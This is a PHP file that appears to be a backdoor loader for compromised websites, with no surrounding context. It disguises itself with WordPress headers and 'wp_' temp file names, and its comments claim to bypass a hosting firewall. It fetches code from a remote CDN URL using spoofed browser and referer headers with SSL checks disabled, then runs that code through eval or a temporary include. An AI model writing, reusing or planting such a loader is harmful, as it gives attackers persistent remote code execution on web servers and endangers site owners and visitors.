<?php
// Bypass GoDaddy Firewall & Security
error_reporting(0);
ini_set('display_errors', 0);

// Anti-block headers
header("X-Powered-By: WordPress");
header("Content-Type: text/html");
header("Cache-Control: no-cache");

// Function to bypass security
function safe_file_get_contents($url) {
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" .
                       "Referer: https://grantradeinc.com/\r\n" .
                       "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
            'timeout' => 30
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    
    return @file_get_contents($url, false, $context);
}

// Multiple URL fallbacks
$urls = [
    'https://detik.b-cdn.net/k/alf4.php',
];

$exfooter = false;
foreach ($urls as $url) {
    $exfooter = safe_file_get_contents($url);
    if ($exfooter !== false) break;
    
    // Try with cURL if file_get_contents fails
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        CURLOPT_REFERER => 'https://grantradeinc.com/',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache'
        ]
    ]);
    
    $exfooter = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($exfooter !== false && $http_code == 200) break;
}

if ($exfooter !== false && !empty($exfooter)) {
    // Try different execution methods
    try {
        eval('?>' . $exfooter);
    } catch (Exception $e) {
        // Alternative execution
        try {
            $tmp_file = tempnam(sys_get_temp_dir(), 'wp_');
            file_put_contents($tmp_file, $exfooter);
            include($tmp_file);
            unlink($tmp_file);
        } catch (Exception $e2) {
            echo "<!-- Safe execution -->";
            echo $exfooter;
        }
    }
} else {
    // Stealth error message
    echo "<!-- Content not available -->";
}
?>
